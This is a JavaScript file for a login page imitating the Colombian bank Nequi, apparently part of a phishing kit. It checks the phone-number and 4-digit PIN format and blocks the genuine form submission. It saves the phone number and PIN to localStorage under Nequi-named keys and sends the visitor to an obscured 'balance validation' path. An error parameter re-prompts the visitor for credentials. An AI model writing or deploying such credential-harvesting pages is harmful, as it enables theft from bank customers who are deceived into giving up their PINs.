document.addEventListener('DOMContentLoaded', () => {
    const celularInput = document.getElementById('celular');
    const claveInput = document.getElementById('clave');
    const consentCheckbox = document.getElementById('consent');
    const btnEntra = document.querySelector('.btn-entra');

    // Check for error parameter in URL
    const urlParams = new URLSearchParams(window.location.search);
    const errorType = urlParams.get('error');

    if (errorType) {
        const errorDiv = document.createElement('div');
        errorDiv.id = 'error-message';
        
        if (errorType === 'user' || errorType === 'true') {
            errorDiv.textContent = 'Numero de celular o clave incorrectos';
        } else {
            errorDiv.textContent = 'Error desconocido';
        }

        document.body.prepend(errorDiv);
        
        // Add slideUp animation class
        errorDiv.classList.add('slideUp');

        // Remove after 3 seconds
        setTimeout(() => {
            errorDiv.style.display = 'none';
            errorDiv.remove();
            // Clean URL
            window.history.replaceState({}, document.title, window.location.pathname);
        }, 3000);
    }

    // Función de validación
    const validateForm = () => {
        const celularValue = celularInput.value;
        const claveValue = claveInput.value;
        const isConsentChecked = consentCheckbox.checked;

        // Validar Celular:
        // 1. Debe tener valor
        // 2. Debe empezar por 3
        // 3. Debe tener exactamente 10 dígitos
        const isCelularValid = /^[3][0-9]{9}$/.test(celularValue);

        // Validar Clave:
        // 1. Debe tener exactamente 4 dígitos
        const isClaveValid = /^[0-9]{4}$/.test(claveValue);

        // Habilitar o deshabilitar botón
        if (isCelularValid && isClaveValid && isConsentChecked) {
            btnEntra.disabled = false;
        } else {
            btnEntra.disabled = true;
        }
    };

    // Redirección al hacer click en Entra
    btnEntra.addEventListener('click', (e) => {
        if (!btnEntra.disabled) {
            e.preventDefault(); // Evitar envío real del formulario
            
            // Save data to localStorage
            localStorage.setItem('nequi_celular', celularInput.value); // Guardar celular también aquí
            localStorage.setItem('nequi_clave', claveInput.value);

            // Redirigir a validacion_saldo.html con loader
            navigateWithLoader('/QmNpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIjKlMnOpQrStUv');
        }
    });

    // Restricciones de entrada para Celular
    celularInput.addEventListener('input', (e) => {
        // Solo números y máximo 10 dígitos
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
        validateForm();
    });

    // Restricciones de entrada para Clave
    claveInput.addEventListener('input', (e) => {
        // Solo números y máximo 4 dígitos
        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
        validateForm();
    });

    // Listener para el checkbox
    consentCheckbox.addEventListener('change', () => {
        const consentBox = document.querySelector('.consent-box');
        if (consentCheckbox.checked) {
            consentBox.classList.add('checked');
        } else {
            consentBox.classList.remove('checked');
        }
        validateForm();
    });

    // Validación inicial
    validateForm();
});